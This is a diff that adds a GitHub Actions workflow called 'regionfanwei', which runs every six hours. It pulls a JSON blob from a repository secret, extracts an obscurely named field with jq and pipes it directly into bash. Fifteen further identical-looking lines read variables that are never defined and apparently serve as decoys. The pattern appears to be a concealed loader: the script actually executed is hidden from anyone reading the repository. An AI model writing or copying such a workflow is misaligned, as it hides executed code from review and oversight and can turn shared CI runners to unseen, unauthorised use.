@@ -1,0 +1,32 @@
+name: regionfanwei
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: regionfanwei
+        env:
+          ku2: ${{ secrets.ku2 }}
+        run: |
+          echo $ku2 | jq -r .h3114 | /bin/bash
+          echo $pkaqa198 | jq -r .pxu24792 | /bin/bash
+          echo $n89692 | jq -r .q0 | /bin/bash
+          echo $jg573 | jq -r .k2431 | /bin/bash
+          echo $bi78 | jq -r .vygv80 | /bin/bash
+          echo $cx86 | jq -r .c688 | /bin/bash
+          echo $pl6767 | jq -r .b06 | /bin/bash
+          echo $gv2105 | jq -r .x773 | /bin/bash
+          echo $wdug440 | jq -r .xehmp79613 | /bin/bash
+          echo $p2192 | jq -r .uof4200 | /bin/bash
+          echo $mlz71442 | jq -r .hn96 | /bin/bash
+          echo $jkam58 | jq -r .a019 | /bin/bash
+          echo $qssv24789 | jq -r .fgl90829 | /bin/bash
+          echo $szutu25 | jq -r .qax821 | /bin/bash
+          echo $sghy6055 | jq -r .tjgsx06 | /bin/bash
+          echo $uw8 | jq -r .nugtv96652 | /bin/bash
+
